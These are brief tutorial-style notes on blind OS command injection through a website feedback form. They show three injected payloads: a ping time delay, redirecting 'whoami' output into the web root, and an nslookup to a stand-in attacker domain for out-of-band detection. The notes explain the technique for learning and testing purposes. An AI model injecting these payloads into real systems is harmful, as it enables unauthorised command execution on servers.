--- ---

<h2>Blind OS Command Injection Vulnerabilities</h2>

Example:
- Website allows users to submit feedback about the website
- Feedback form sends email to a site administrator mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com

- Detection/Exploit:
	- Inject a command that triggers a time delay
		& ping -c 10 127.0.0.1 &
		§ Will ping loopback adapter for 10 seconds

- Redirect Output into a file in the web root
	& whoami > /var/www/static/whoami.txt &
	§ Use a browser to fetch /whoami.txt to see the output

- Exploit using out-of-band (OAST) techniques
	& nslookup kgji2ohoyw.web-attacker.com &
	§ Attacker can monitor for the specified lookup occuring